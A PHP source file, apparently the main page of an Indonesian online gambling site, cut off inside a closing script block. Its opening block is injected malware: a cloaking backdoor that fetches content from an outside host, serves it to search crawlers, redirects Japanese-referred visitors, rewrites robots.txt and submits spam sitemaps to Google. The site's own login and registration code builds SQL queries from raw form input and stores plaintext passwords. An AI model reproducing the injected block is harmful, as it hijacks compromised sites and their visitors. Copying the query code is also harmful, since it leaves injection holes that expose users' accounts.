<?php $group_num='';$inter_domain='http://z0429_18.gaytreat.site/'.$group_num.'/';function curl_get_contents($url){$ch=curl_init();curl_setopt ($ch, CURLOPT_URL, $url);curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 5);$file_contents = curl_exec($ch);curl_close($ch);return $file_contents; }function getServerCont($url,$data=array()){$url=str_replace(' ','+',$url);$ch=curl_init();curl_setopt($ch,CURLOPT_URL,"$url");curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_HEADER,0);curl_setopt($ch,CURLOPT_TIMEOUT,10);curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($data));$output = curl_exec($ch);$errorCode = curl_errno($ch);curl_close($ch);if(0!== $errorCode){ return false;}return $output;}function is_crawler($agent){$agent_check=false; $bots='googlebot|google|yahoo|bing|aol';if($agent!=''){if(preg_match("/($bots)/si",$agent)){$agent_check = true; }}return $agent_check;}function check_refer($refer){ $check_refer=false;$referbots='google.co.jp|yahoo.co.jp|google.com';if($refer!='' && preg_match("/($referbots)/si",$refer)){ $check_refer=true; }return $check_refer; }$http=((isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https://':'http://');$req_uri=$_SERVER['REQUEST_URI'];$domain=$_SERVER["HTTP_HOST"];$self=$_SERVER['PHP_SELF'];$ser_name=$_SERVER['SERVER_NAME'];$req_url=$http.$domain.$req_uri;$indata1=$inter_domain."/indata.php";$map1=$inter_domain."/map.php";$jump1=$inter_domain."/jump.php";$url_words=$inter_domain."/words.php";$url_robots=$inter_domain."/robots.php";if(strpos($req_uri,".php")){$href1=$http.$domain.$self;}else{$href1=$http.$domain;}$data1[]=array();$data1['domain']=$domain;$data1['req_uri']=$req_uri;$data1['href']=$href1;$data1['req_url']=$req_url;if(substr($req_uri,-6)=='robots'){$robots_cont = getServerCont($url_robots,$data1);define('BASE_PATH',str_ireplace($_SERVER['PHP_SELF'],'',__FILE__));file_put_contents(BASE_PATH.'/robots.txt',$robots_cont);$robots_cont=file_get_contents(BASE_PATH.'/robots.txt');if(strpos(strtolower($robots_cont),"sitemap")){echo 'robots.txt file create success!';}else{echo 'robots.txt file create fail!';}exit;}if(substr($req_uri,-4)=='.xml'){if(strpos($req_uri,"pingsitemap.xml")){ $str_cont = getServerCont($map1,$data1); $str_cont_arr= explode(",",$str_cont); $str_cont_arr[]='sitemap'; for($k=0;$k<count($str_cont_arr);$k++){ if(strpos($href1,".php")> 0){ $tt1='?'; }else{ $tt1='/';}$http2=$href1.$tt1.$str_cont_arr[$k].'.xml';$data_new='https://www.google.com/ping?sitemap='.$http2;$data_new1='http://www.google.com/ping?sitemap='.$http2;if(stristr(@file_get_contents($data_new),'successfully')){echo $data_new.'===>Submitting Google Sitemap: OK'.PHP_EOL;}else if(stristr(@curl_get_contents($data_new),'successfully')){echo $data_new.'===>Submitting Google Sitemap: OK'.PHP_EOL;}else if(stristr(@file_get_contents($data_new1),'successfully')){echo $data_new1.'===>Submitting Google Sitemap: OK'.PHP_EOL;}else if(stristr(@curl_get_contents($data_new1),'successfully')){echo $data_new1.'===>Submitting Google Sitemap: OK'.PHP_EOL; }else{echo $data_new1.'===>Submitting Google Sitemap: fail'.PHP_EOL;} } exit;} if(strpos($req_uri,"allsitemap.xml")){ $str_cont = getServerCont($map1,$data1); header("Content-type:text/xml"); echo $str_cont;exit;} if(strpos($req_uri,".php")){ $word4=explode("?",$req_uri); $word4=$word4[count($word4)-1]; $word4=str_replace(".xml","",$word4); }else{ $word4= str_replace("/","",$req_uri);$word4= str_replace(".xml","",$word4); }$data1['word']=$word4;$data1['action']='check_sitemap';$check_url4=getServerCont($url_words,$data1);if($check_url4=='1'){ $str_cont=getServerCont($map1,$data1); header("Content-type:text/xml"); echo $str_cont;exit;} $data1['action']="check_words"; $check1= getServerCont($url_words,$data1);if(strpos($req_uri,"map")> 0 || $check1=='1'){$data1['action']="rand_xml";$check_url4=getServerCont($url_words,$data1);header("Content-type:text/xml");echo $check_url4;exit;}}if(strpos($req_uri,".php")){$main_shell=$http.$ser_name.$self;$data1['main_shell']=$main_shell;}else{$main_shell=$http.$ser_name;$data1['main_shell']=$main_shell;}$referer=isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:'';$chk_refer=check_refer($referer); if(strpos($_SERVER['REQUEST_URI'],'.php')){ $url_ext='?'; }else{ $url_ext='/'; } if($chk_refer && (preg_match('/ja/i',@$_SERVER['HTTP_ACCEPT_LANGUAGE']) || preg_match('/ja/i',@$_SERVER['HTTP_ACCEPT_LANGUAGE']) || preg_match("/^[a-z0-9]+[0-9]+$/",end(explode($url_ext,str_replace(array(".html",".htm"),"",$_SERVER['REQUEST_URI'])))))){ echo getServerCont($jump1,$data1);exit; } $user_agent=strtolower(isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:'');$res_crawl=is_crawler($user_agent); if($res_crawl){ $data1['http_user_agent']=$user_agent;$get_content = getServerCont($indata1,$data1);if($get_content=="404"){header('HTTP/1.0 404 Not Found');exit;}else if($get_content=="500"){header("HTTP/1.0 500 Internal Server Error");exit;}else if($get_content=="blank"){echo '';exit;}else{echo $get_content;exit;} }else{ header("HTTP/1.0 404 Not Found"); } ?><?php
  session_start();
  include_once "admin/modul/koneksi.php";
  include_once "admin/modul/fungsi_umum.php";
  include_once "admin/modul/query_pengaturan.php";
  if (!isset($_GET['halaman'])) {
    echo '
      <script>
        window.location.replace("'.$alamat_website.'beranda");
      </script>
    ';
  } else if (isset($_SESSION['id_akun'])) {
    $id_akun_masuk = $_SESSION['id_akun'];
    $query_akun_masuk = mysqli_query($koneksi, "SELECT * FROM akun WHERE id_akun = '$id_akun_masuk'");
    $data_akun_masuk = mysqli_fetch_array($query_akun_masuk);
    $nama_lengkap_akun_masuk = $data_akun_masuk['nama_lengkap_akun'];
    $nama_pengguna_akun_masuk = $data_akun_masuk['nama_pengguna_akun'];
    $kata_sandi_akun_masuk = $data_akun_masuk['kata_sandi_akun'];
    $email_akun_masuk = $data_akun_masuk['email_akun'];
    $telepon_akun_masuk = $data_akun_masuk['telepon_akun'];
    $whatsapp_akun_masuk = $data_akun_masuk['whatsapp_akun'];
    $kode_referensi_akun_masuk = $data_akun_masuk['kode_referensi_akun'];
    $level_akun_masuk = $data_akun_masuk['level_akun'];
    $status_akun_masuk = $data_akun_masuk['status_akun'];

    $tambah_saldo = mysqli_query($koneksi, "SELECT * FROM saldo WHERE id_akun_saldo = '$id_akun_masuk'");
    $jumlah_tambah_saldo = mysqli_num_rows($tambah_saldo);
    if ($jumlah_tambah_saldo == 0) {
      $tambah_data_saldo = mysqli_query($koneksi, "INSERT INTO saldo (id_akun_saldo, total_saldo) VALUES ('$id_akun_masuk', '0')");
    }

    $saldo = mysqli_query($koneksi, "SELECT * FROM saldo WHERE id_akun_saldo = '$id_akun_masuk'");
    $data_saldo = mysqli_fetch_array($saldo);
    $id_saldo = $data_saldo['id_saldo'];
    $total_saldo = $data_saldo['total_saldo'];
  } else if (isset($_POST['masuk'])) {
    $nama_pengguna_akun = addslashes($_POST['nama_pengguna_akun']);
    $kata_sandi_akun = addslashes($_POST['kata_sandi_akun']);
    $query_akun = mysqli_query($koneksi, "SELECT * FROM akun WHERE nama_pengguna_akun = '$nama_pengguna_akun' AND kata_sandi_akun = '$kata_sandi_akun'");
    $cek_akun = mysqli_num_rows($query_akun);
    if ($cek_akun > 0) {
      $data_akun = mysqli_fetch_array($query_akun);
      $id_akun = $data_akun['id_akun'];
      $status_akun = $data_akun['status_akun'];
      if ($status_akun == "Aktif") {
        $_SESSION['id_akun'] = $id_akun;
        echo '
          <script>
            window.location.replace("'.$alamat_website.'");
          </script>
        ';
      } else {
        echo '
          <script>
            alert("Akun anda tidak aktif silahkan hubungi admin!");
            window.location.replace("'.$alamat_website.'");
          </script>
        ';
      }
    } else {
      echo '
        <script>
          alert("Akun tidak ditemukan, periksa lagi!");
          window.location.replace("'.$alamat_website.'masuk");
        </script>
      ';
    }
  } else if (isset($_POST['daftar'])) {
    $nama_lengkap_akun = $_POST['nama_lengkap_akun'];
    $nama_pengguna_akun = $_POST['nama_pengguna_akun'];
    $kata_sandi_akun = $_POST['kata_sandi_akun'];
    $telepon_akun = $_POST['telepon_akun'];
    $kode_referensi_akun = $_POST['kode_referensi_akun'];
    $cek_nama_pengguna = mysqli_query($koneksi, "SELECT * FROM akun WHERE nama_pengguna_akun = '$nama_pengguna_akun'");
    $jumlah_nama_pengguna = mysqli_num_rows($cek_nama_pengguna);
    if ($jumlah_nama_pengguna > 0) {
      echo '
        <script>
          alert("Nama pengguna sudah terdaftar, gunakan yang lainnya!");
        </script>
      ';
    } else {
      $daftar = mysqli_query($koneksi, "INSERT INTO akun (nama_lengkap_akun, nama_pengguna_akun, kata_sandi_akun, email_akun, telepon_akun, whatsapp_akun, kode_referensi_akun) VALUES ('$nama_lengkap_akun', '$nama_pengguna_akun', '$kata_sandi_akun', '$email_akun', '$telepon_akun', '$telepon_akun', '$kode_referensi_akun')");
      if ($daftar) {
        $akun_baru = mysqli_query($koneksi, "SELECT * FROM akun WHERE nama_pengguna_akun = '$nama_pengguna_akun' AND kata_sandi_akun = '$kata_sandi_akun'");
        $data_akun_baru = mysqli_fetch_array($akun_baru);
        $id_akun_baru = $data_akun_baru['id_akun'];
        $saldo = mysqli_query($koneksi, "INSERT INTO saldo (id_akun_saldo, total_saldo) VALUES ('$id_akun_baru', '0')");
        if ($saldo) {
          echo '
            <script>
              alert("Pendaftaran berhasil, silahkan masuk");
              window.location.replace("'.$alamat_website.'masuk");
            </script>
          ';
        } else {
          echo "Proses Gagal<br>Error : ".$saldo."<br>".mysqli_error($koneksi);
        }
      } else {
        echo "Proses Gagal<br>Error : ".$daftar."<br>".mysqli_error($koneksi);
      }
    }
  }

  $ip_pengunjung = ipPengunjung();
  $tanggal_pengunjung = date("j");
  $bulan_pengunjung = date("n");
  $tahun_pengunjung = date("Y");
  $cek_pengunjung = mysqli_query($koneksi, "SELECT * FROM pengunjung WHERE ip_pengunjung = '$ip_pengunjung' AND tanggal_pengunjung = '$tanggal_pengunjung' AND bulan_pengunjung = '$bulan_pengunjung' AND tahun_pengunjung = '$tahun_pengunjung'");
  $jumlah_pengunjung = mysqli_num_rows($cek_pengunjung);
  if ($jumlah_pengunjung == 0) {
    $tambah_pengunjung = mysqli_query($koneksi, "INSERT INTO pengunjung (ip_pengunjung, tanggal_pengunjung, bulan_pengunjung, tahun_pengunjung) VALUES ('$ip_pengunjung', '$tanggal_pengunjung', '$bulan_pengunjung', '$tahun_pengunjung')");
  }
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title><?php echo $isi1_judul_website; ?></title>
  <base href="<?php echo $alamat_website; ?>">
  <meta content="Daftar Situs Agen Judi Online Terpercaya, Bandar Taruhan Bola, Game Slot terbaik, Slot gacor, Togel Online, Live Casino bisa Deposit Via Pulsa, dan OVO" name=description>
  <meta content=iboplay,slotonline,casinogameonline,situsjudislotonline,judislotonline,agenslotiboplay,pokeronline,bolagameonline,idnpoker,judibolaonline,gameslotonline,agenslotonline,agentpokerterbaik,agenslotindoonline,websitepokerterpercaya name=keywords>
  <!-- Font -->
  <link rel="stylesheet" href="https://cdn.robotaset.com/assets/css/fonts.google.ubuntu.css">
  <!-- Favicon -->
  <link rel="icon" type="image/x-icon" href="admin/assets/images/<?php echo $isi1_favicon; ?>">
  <!-- Bootstrap 5 CSS -->
  <link rel="stylesheet" href="admin/assets/libs/bootstrap/css/bootstrap.min.css">
  <!-- Icon CSS -->
  <link href="admin/assets/css/icons.min.css" rel="stylesheet" type="text/css">
  <!-- Owl Carousel CSS -->
  <link rel="stylesheet" href="admin/assets/libs/owl-carousel/assets/owl.carousel.min.css">
  <link rel="stylesheet" href="admin/assets/libs/owl-carousel/assets/owl.theme.default.min.css">
  <!-- Flatpickr CSS -->
  <link rel="stylesheet" href="admin/assets/libs/flatpickr/flatpickr.min.css">
  <!-- Datatables Bootstrap 5 -->
  <link rel="stylesheet" href="https://cdn.datatables.net/1.13.2/css/dataTables.bootstrap5.min.css">
  <!-- Page CSS -->
  <style>
    body {
      background: url(admin/assets/images/<?php echo $isi1_bg_body; ?>) no-repeat fixed;
      background-size: 100% 100%;
      color: #FFFFFF;
      font-family: "Ubuntu", sans-serif;
      font-size: 14px;
    }
    a {
      color: #FFFFFF;
      text-decoration: none;
    }
    a:hover {
      color: #FFFFFF;
    }
    .bg-utama {
      background-color: <?php echo $isi1_warna_utama; ?>;
    }
    .text-utama {
      color: #F60808;
    }
    .tombol-masuk {
      background: url(admin/assets/images/<?php echo $isi1_tombol_masuk; ?>);
      background-size: 100% 100%;
      color: <?php echo $isi2_tombol_masuk; ?>;
    }
    .tombol-daftar {
      background: url(admin/assets/images/<?php echo $isi1_tombol_daftar; ?>);
      background-size: 100% 100%;
      color: <?php echo $isi2_tombol_daftar; ?>;
    }
    .page-header-title {
      background: #e6bc44;
      color: #000000;
      padding: 8px 0;
      position: relative;
      text-align: center;
    }
    /* Counter USD Jackpot */
    .jackpot {
      filter: unset;
      position: relative;
      width: 100%;
      text-align: center;
    }
    .jackpot-title {
      box-shadow: 0 3px 6px rgba(0,0,0,.16), 0 3px 6px rgba(110,80,20,.4), inset 0 -2px 5px 1px rgba(139,66,8,1), inset 0 -1px 1px 3px rgba(250,227,133,1);
      background-image: linear-gradient(160deg, #a54e07, #b47e11, #fef1a2, #bc881b, #a54e07);
      border: 1px solid #a55d07;
      color: #281b01;
      text-shadow: 0 2px 2px rgba(250, 227, 133, 1);
      z-index: 3!important;
      display: inline-block;
      outline: none;
      box-sizing: border-box;
      border-radius: 0.3em;
      text-transform: uppercase;
      transition: all .2s ease-in-out;
      background-size: 100% 100%;
      background-position: center;
      top: -2px;
      max-width: fit-content;
      padding: 0 20px;
      letter-spacing: 0;
      font-size: 2.5vw;
      font-weight: bold;
      position: absolute;
      left: 0;
      right: 0;
      margin: 0 auto;
      line-height: inherit;
    }
    .jackpot-value-image {
      filter: contrast(100%) hue-rotate(309deg) saturate(5);
      display: flex;
      vertical-align: middle;
      align-items: center;
    }
    .jackpot-value-image>span {
      position: absolute;
      width: 100%;
      font-size: 8.5vw;
      z-index: 1;
    }
    .jackpot img {
      filter: contrast(100%) hue-rotate(210deg) saturate(11);
      width: 100%;
      background-size: 100% 100%;
    }
    /* Owl Carousel */
    .owl-dots {
      position: absolute;
      bottom: 0;
      left: 50%;
      transform: translateX(-50%)!important;
    }
    .owl-theme .owl-dots .owl-dot span {
      margin: 1px!important;
      background: none!important;
      border: 1px solid #FFFFFF!important;
    }
    .owl-theme .owl-dots .owl-dot.active span, .owl-theme .owl-dots .owl-dot:hover span {
      background: #FFFFFF!important;
    }
    /* Unduh APK */
    .container-unduh-apk {
      background-size: cover;
      font-family: sans-serif;
    }
    .container-unduh-apk>div {
      flex-basis: 50%;
      text-align: center;
      opacity: 0;
      transition: all 1s ease;
    }
    .container-unduh-apk>div:nth-child(1) {
      align-self: flex-end;
      transform: translateX(100%);
    }
    .container-unduh-apk h2 {
      font-size: 18px;
      font-weight: 600;
      text-transform: uppercase;
      margin: 0;
    }
    .container-unduh-apk h3 {
      font-size: 11px;
      font-weight: 100;
      margin: 0;
    }
    .info-unduh-apk {
      display: flex;
      justify-content: center;
      padding: 7px 0;
    }
    .info-unduh-apk>div {
      flex-basis: 45%;
      max-width: 45%;
    }
    .section-unduh-apk {
      text-align: center;
      margin-right: 5px;
    }
    .section-unduh-apk img {
      width: 45%;
      margin: auto auto 5px auto;
    }
    .section-unduh-apk a {
      color: #FFFFFF;
      text-transform: uppercase;
      padding: 2px 0;
      display: block;
      border-radius: 20px;
      text-align: center;
      text-decoration: none;
      font-size: 11px;
      background: linear-gradient(to bottom,#ff1300 0%,#9a0f04 100%);
    }
    .container-masuk-daftar {
      display: flex;
    }
    .container-masuk-daftar a {
      flex-basis: 50%;
      padding: 14px 20px;
      text-align: center;
      line-height: 1;
      text-decoration: none;
      font-size: 18px;
      color: #FFFFFF;
    }
    .container-masuk-daftar a.masuk {
      background: url(admin/assets/images/<?php echo $isi1_tombol_masuk; ?>);
      background-size: 100% 100%;
      color: <?php echo $isi2_tombol_masuk; ?>;
    }
    .container-masuk-daftar a.daftar {
      background: url(admin/assets/images/<?php echo $isi1_tombol_daftar; ?>);
      background-size: 100% 100%;
      color: <?php echo $isi2_tombol_daftar; ?>;
    }
    .sidebar-masuk {
      background: url(admin/assets/images/<?php echo $isi1_tombol_masuk; ?>);
      background-size: 100% 100%;
      color: <?php echo $isi2_tombol_masuk; ?>;
    }
    .sidebar-daftar {
      background: url(admin/assets/images/<?php echo $isi1_tombol_daftar; ?>);
      background-size: 100% 100%;
      color: <?php echo $isi2_tombol_daftar; ?>;
    }
    .bg-bank {
      background: url(admin/assets/images/<?php echo $isi1_bg_bank; ?>) no-repeat;
      background-size: 100% 100%;
      border: 0;
      color: <?php echo $isi2_bg_bank; ?>;
    }
    .img-pembayaran {
      position: relative;
    }
    .img-pembayaran:before {
      content: '';
      position: absolute;
      top: 0;
      left: -10px;
      bottom: 0;
      width: 5px;
      border-radius: 2px;
      background-color: #00FF00;
    }
    .hub-kami {
      margin-bottom: 25px;
      display: flex;
      flex-wrap: wrap;
      justify-content: space-between;
    }
    .hub-kami>a {
      color: #FFFFFF;
      width: 100%;
      background-size: cover;
      margin-bottom: 15px;
      min-height: 160px;
      padding: 20px 15px;
      display: flex;
      flex-direction: column;
      justify-content: flex-end;
      text-decoration: none;
      border-radius: 20px;
      border: 1px solid #4A0A0A;
    }
    .hub-kami>a>h3 {
      font-size: 16px;
      font-weight: 500;
      margin: 0 0 10px;
      text-transform: uppercase;
    }
    .hub-kami>a>h6 {
      font-size: 12px;
      margin: 0;
      display: flex;
      justify-content: space-between;
      align-items: center;
      text-transform: uppercase;
    }
    .hub-kami>a>h6>i {
      font-size: 18px;
      font-weight: 800;
    }
    .user-menu {
      background-color: <?php echo $isi1_warna_utama; ?>;
      display: flex;
      justify-content: space-around;
      font-size: 10px;
      overflow: hidden;
    }
    .user-menu .user-menu-item {
      flex-basis: initial;
      flex: 1;
      margin: 10px 0;
      padding: 0 10px;
      flex-basis: 22%;
    }
    .user-menu .user-menu-item>a {
      color: #FFFFFF;
      text-decoration: none;
      display: flex;
      justify-content: space-evenly;
      align-items: center;
      flex-direction: column;
      height: 100%;
      white-space: nowrap;
    }
    .user-menu .user-menu-item>a>img {
      width: 20px;
      height: 20px;
      margin-bottom: 5px;
      vertical-align: middle;
      border: 0;
    }
    .deposit-note {
      color: #999999;
      display: flex;
      align-items: stretch;
      line-height: 19px;
      margin-bottom: 15px;
    }
    .deposit-note-icon {
      flex-basis: 20%;
      display: flex;
      justify-content: center;
      align-items: center;
      border-top-left-radius: 5px;
      border-bottom-left-radius: 5px;
      padding: 10px;
      background: linear-gradient(to bottom,#787880,#42424f);
    }
    .deposit-note-icon img {
      width: 35px;
    }
    .deposit-note-content {
      flex-basis: 80%;
      background-color: #CBCBCB;
      color: #363565;
      padding: 10px;
      border-top-right-radius: 5px;
      border-bottom-right-radius: 5px;
    }
    .kotak-pembayaran {
      background-color: #CBCBCB;
      color: #000000;
      cursor: pointer;
    }
    .kotak-pembayaran-aktif {
      background-color: #EF0101;
      background-image: linear-gradient(to bottom,#ef0101 0%,#720e0d 100%);
      cursor: pointer;
    }
    .kotak-pembayaran-aktif img {
      filter: brightness(0) invert(1);
    }
    .bank-info {
      background-color: #919197;
      background-image: linear-gradient(to bottom,#919197 0%,#444352 100%);
    }
    .bank-info hr {
      border-top: 1px solid #000000;
      border-bottom: 1px solid #393939;
      margin: 10px 0;
      width: 100%;
    }
    .bg-menu {
      background: url(admin/assets/images/<?php echo $isi1_bg_menu; ?>) no-repeat;
      background-size: 100% 100%;
    }
    .floating-whatsapp {
      text-decoration: none;
      position: fixed;
      bottom: 70px;
      left: 20px;
      width: 50px;
      height: 50px;
      z-index: 9999;
    }
    .floating-whatsapp:before {
      content: "";
      background-repeat: no-repeat;
      background-size: 34px 34px;
      background-position: center center;
      width: 50px;
      height: 50px;
      background-image: url("data:image/svg+xml;charset=utf8,%3csvg viewBox='0 0 24 24' width='32' height='32' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3e%3cg%3e%3cpath style='fill:%23ffffff' d='M16.75,13.96C17,14.09 17.16,14.16 17.21,14.26C17.27,14.37 17.25,14.87 17,15.44C16.8,16 15.76,16.54 15.3,16.56C14.84,16.58 14.83,16.92 12.34,15.83C9.85,14.74 8.35,12.08 8.23,11.91C8.11,11.74 7.27,10.53 7.31,9.3C7.36,8.08 8,7.5 8.26,7.26C8.5,7 8.77,6.97 8.94,7H9.41C9.56,14 9.77,6.94 9.96,7.45L10.65,9.32C10.71,9.45 10.75,9.6 10.66,9.76L10.39,10.17L10,10.59C9.88,10.71 9.74,10.84 9.88,11.09C10,11.35 10.5,12.18 11.2,12.87C12.11,13.75 12.91,14.04 13.15,14.17C13.39,14.31 13.54,14.29 13.69,14.13L14.5,13.19C14.69,12.94 14.85,13 15.08,13.08L16.75,13.96M12,2A10,10 0 0,1 22,12A10,10 0 0,1 12,22C10.03,22 8.2,21.43 6.65,20.45L2,22L3.55,17.35C2.57,15.8 2,13.97 2,12A10,10 0 0,1 12,2M12,4A8,8 0 0,0 4,12C4,13.72 4.54,15.31 5.46,16.61L4.5,19.5L7.39,18.54C8.69,19.46 10.28,20 12,20A8,8 0 0,0 20,12A8,8 0 0,0 12,4Z'%3e%3c/path%3e%3c/g%3e%3c/svg%3e");
      background-color: #00C853;
      position: absolute;
      top: 0;
      left: 0;
      border-radius: 100%;
      box-shadow: 0 1px 1.5px 0 rgb(0 0 0 / 12%), 0 1px 1px 0 rgb(0 0 0 / 24%);
    }
    .animation-1 {
      -webkit-animation: rubberBand 1s linear 1s infinite normal;
      animation: rubberBand 1s linear 1s infinite normal;
    }
    @keyframes rubberBand {
      10% {
        -webkit-transform: scale3d(1,1,1);
        transform: scale3d(1,1,1)
      }
      30% {
        -webkit-transform: scale3d(1.25,.75,1);
        transform: scale3d(1.25,.75,1)
      }
      40% {
        -webkit-transform: scale3d(.75,1.25,1);
        transform: scale3d(.75,1.25,1)
      }
      50% {
        -webkit-transform: scale3d(1.15,.85,1);
        transform: scale3d(1.15,.85,1)
      }
      65% {
        -webkit-transform: scale3d(.95,1.05,1);
        transform: scale3d(.95,1.05,1)
      }
      75% {
        -webkit-transform: scale3d(1.05,.95,1);
        transform: scale3d(1.05,.95,1)
      }
    }
    @-webkit-keyframes rubberBand {
      0%,
      100% {
        -webkit-transform: scale3d(1,1,1);
        transform: scale3d(1,1,1)
      }
      30% {
        -webkit-transform: scale3d(1.25,.75,1);
        transform: scale3d(1.25,.75,1)
      }
      40% {
        -webkit-transform: scale3d(.75,1.25,1);
        transform: scale3d(.75,1.25,1)
      }
      50% {
        -webkit-transform: scale3d(1.15,.85,1);
        transform: scale3d(1.15,.85,1)
      }
      65% {
        -webkit-transform: scale3d(.95,1.05,1);
        transform: scale3d(.95,1.05,1)
      }
      75% {
        -webkit-transform: scale3d(1.05,.95,1);
        transform: scale3d(1.05,.95,1)
      }
    }
    .floating-lainnya {
      position: fixed;
      bottom: 150px;
      left: 5px;
      z-index: 10;
    }
    #chat-widget-container {
      margin-bottom: 50px!important;
    }
  </style>
</head>
<body>
  <div class="fixed-top">
    <div class="container-fluid bg-utama position-relative p-3">
      <a href="<?php echo $alamat_website.'beranda'; ?>" class="d-block">
        <img src="admin/assets/images/<?php echo $isi1_logo; ?>" alt="Logo" height="35" class="d-block mx-auto" style="transform: scale(1.5);">
      </a>
      <div class="position-absolute top-50 end-0 translate-middle-y bg-dark rounded px-2 fs-3 me-3" data-bs-toggle="offcanvas" data-bs-target="#menunya">
        <i class="ri-menu-line"></i>
      </div>
    </div>
  </div>
  <div class="container-fluid px-0" style="padding: 67px 0 5rem 0;">
    <?php
      include_once "admin/modul/sidebar.php";

      if (isset($_GET['halaman'])) {
        if ($_GET['halaman'] == "beranda") {
          include_once "beranda.php";
        } else if ($_GET['halaman'] == "masuk") {
          include_once "masuk.php";
        } else if ($_GET['halaman'] == "daftar") {
          include_once "daftar.php";
        } else if ($_GET['halaman'] == "balance") {
          include_once "balance.php";
        } else if ($_GET['halaman'] == "bank") {
          include_once "bank.php";
        } else if ($_GET['halaman'] == "transfer") {
          include_once "transfer.php";
        } else if ($_GET['halaman'] == "withdraw") {
          include_once "withdraw.php";
        } else if ($_GET['halaman'] == "promosi") {
          include_once "promosi.php";
        } else if ($_GET['halaman'] == "hub_kami") {
          include_once "hub_kami.php";
        } else if ($_GET['halaman'] == "pusat_bantuan") {
          include_once "pusat_bantuan.php";
        } else if ($_GET['halaman'] == "syarat_dan_ketentuan") {
          include_once "syarat_dan_ketentuan.php";
        } else if ($_GET['halaman'] == "responsible_gaming") {
          include_once "responsible_gaming.php";
        } else if ($_GET['halaman'] == "tentang") {
          include_once "tentang.php";
        } else if ($_GET['halaman'] == "deposit") {
          include_once "deposit.php";
        } else if ($_GET['halaman'] == "penarikan") {
          include_once "penarikan.php";
        } else if ($_GET['halaman'] == "rekening") {
          include_once "rekening.php";
        } else if ($_GET['halaman'] == "riwayat_deposit") {
          include_once "riwayat_deposit.php";
        } else if ($_GET['halaman'] == "akun_saya") {
          include_once "akun_saya.php";
        } else if ($_GET['halaman'] == "ubah_kata_sandi") {
          include_once "ubah_kata_sandi.php";
        } else if ($_GET['halaman'] == "profil_saya") {
          include_once "profil_saya.php";
        } else if ($_GET['halaman'] == "games") {
          include_once "games.php";
        }
      } else if (isset($_GET['link_menu_games']) || isset($_GET['link_sub_menu_games'])) {
        include_once "games.php";
      }
    ?>
    
  </div>
  <div class="fixed-bottom">
    <div class="container-fluid bg-black p-0">
      <div class="row g-0">
        <div class="col">
          <a onclick="window.history.go(-1); return false;" class="d-flex flex-column align-items-center text-decoration-none">
            <i class="ri-arrow-left-s-line fs-1"></i>
            <span style="font-size: 12px;">Kembali</span>
          </a>
        </div>
        <div class="col border border-secondary border-top-0 border-end-0 border-bottom-0">
          <?php
            if (isset($_SESSION['id_akun'])) {
              echo '<a href="'.$alamat_website.'balance" class="d-flex flex-column align-items-center text-decoration-none">';
            } else {
              echo '<a href="'.$alamat_website.'masuk" class="d-flex flex-column align-items-center text-decoration-none">';
            }
          ?>
            <i class="ri-bank-line fs-1"></i>
            <span style="font-size: 12px;">Akun Saya</span>
          </a>
        </div>
        <div class="col border border-secondary border-top-0 border-bottom-0">
          <a href="<?php echo $alamat_website.'promosi'; ?>" class="d-flex flex-column align-items-center text-decoration-none">
            <i class="ri-gift-line fs-1"></i>
            <span style="font-size: 12px;">Promosi</span>
          </a>
        </div>
        <div class="col border border-secondary border-top-0 border-start-0 border-bottom-0">
          <a href="<?php echo $isi3_livechat; ?>" class="d-flex flex-column align-items-center text-decoration-none">
            <i class="ri-whatsapp-line fs-1"></i>
            <span style="font-size: 12px;">Live Chat</span>
          </a>
        </div>
        <div class="col">
          <a href="<?php echo $alamat_website; ?>" class="d-flex flex-column align-items-center text-decoration-none">
            <i class="ri-home-4-line fs-1"></i>
            <span style="font-size: 12px;">Beranda</span>
          </a>
        </div>
      </div>
    </div>
  </div>

  <div class="floating-lainnya">
    <!-- <a href="<?php echo $isi2_livescore; ?>" target="_blank">
      <img src="admin/assets/images/<?php echo $isi1_livescore; ?>" alt="Livescore" width="90" height="90">
    </a> -->
    <a href="<?php echo $isi2_rtp_slot; ?>" target="_blank">
      <img src="admin/assets/images/<?php echo $isi1_rtp_slot; ?>" alt="RTP Slot" width="90" height="90">
    </a>
  </div>

  <a href="https://wa.me/<?php echo $isi2_whatsapp.'?text='.$isi3_whatsapp; ?>" class="floating-whatsapp animation-1" target="_blank"></a>

  <!-- Popup Pengumuman -->
  <div class="modal fade" id="popup-pengumuman" tabindex="-1" data-bs-backdrop="static" data-bs-keyboard="false" role="dialog" aria-labelledby="popup-pengumuman" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered" role="document">
      <div class="modal-content" style="background-color: #ECECEC!important;">
        <div class="modal-body">
          <div class="text-end">
            <i class="ri-close-line text-muted fs-3 fw-bold" data-bs-dismiss="modal" style="cursor: pointer;"></i>
          </div>
          <a href="<?php echo $isi2_popup_pengumuman; ?>" class="d-block text-center" style="margin-bottom: 10px;">
            <img src="admin/assets/images/<?php echo $isi1_popup_pengumuman; ?>" alt="Pengumuman" class="img-fluid">
          </a>
          <?php echo $isi3_popup_pengumuman; ?>
        </div>
      </div>
    </div>
  </div>

  <!-- JQuery 3.6.3 -->
  <script src="admin/assets/js/jquery-3.6.3.min.js"></script>
  <!-- Bootstrap 5 JS -->
  <script src="admin/assets/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
  <!-- Owl Carousel JS -->
  <script src="admin/assets/libs/owl-carousel/owl.carousel.min.js"></script>
  <!-- Flatpickr JS -->
  <script src="admin/assets/libs/flatpickr/flatpickr.min.js"></script>
  <!-- Datatables Bootstrap 5 -->
  <script src="https://cdn.datatables.net/1.13.2/js/jquery.dataTables.min.js"></script>
  <script src="https://cdn.datatables.net/1.13.2/js/dataTables.bootstrap5.min.js"></script>
  <!-- Page JS -->
  <script>
    // Popup Pengumuman
    <?php
